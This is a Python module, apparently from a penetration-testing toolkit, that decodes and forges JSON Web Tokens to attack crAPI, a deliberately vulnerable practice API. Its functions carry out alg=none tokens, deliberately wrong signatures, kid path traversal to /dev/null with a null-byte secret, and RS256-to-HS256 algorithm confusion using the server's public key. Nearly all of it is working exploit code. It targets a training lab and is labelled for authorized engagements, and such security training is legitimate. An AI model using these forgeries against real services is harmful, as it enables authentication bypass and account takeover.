"""JWT forge (stdlib only): decode and craft tokens for the crAPI JWT attacks.

No ``pyjwt`` dependency: HS256 uses ``hmac`` + ``base64.urlsafe_b64encode``. The
attacks below are the ones crAPI documents (challenge 15):

* **alg=none** -- the signature is dropped entirely.
* **invalid signature** -- the dashboard endpoint does not verify the signature,
  so any token with the right ``sub`` is accepted.
* **kid path traversal** -- ``kid=../../../../../../dev/null`` makes the server
  load an empty key; sign HS256 with the null-byte secret (``AA==``).
* **algorithm confusion (RS256 -> HS256)** -- the server's RSA *public* key is
  reused as an HMAC secret.

For authorized engagements only.
"""

from __future__ import annotations

import base64
import hmac
import hashlib
import json
from typing import Dict, Optional, Tuple


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def decode_unverified(token: str) -> Tuple[Dict, Dict, str]:
    """Split a JWT into (header, payload, signature) without verifying."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def encode_hs256(payload: Dict, secret: bytes, header_extra: Optional[Dict] = None) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def encode_none(payload: Dict, header_extra: Optional[Dict] = None) -> str:
    header = {"alg": "none", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_kid_path_traversal(payload: Dict) -> str:
    """HS256 signed with the null-byte secret (``AA==``) and a /dev/null kid."""
    return encode_hs256(payload, b"\x00",
                        header_extra={"kid": "../../../../../../dev/null"})


def forge_alg_confusion(payload: Dict, public_key_pem: bytes) -> str:
    """RS256 -> HS256 confusion: sign with the server's public key as HMAC secret."""
    return encode_hs256(payload, public_key_pem,
                        header_extra={"alg": "HS256"})


def forge_invalid_signature(payload: Dict, secret: bytes = b"x") -> str:
    """A well-formed HS256 token with a deliberately wrong secret (no verify on target)."""
    return encode_hs256(payload, secret)
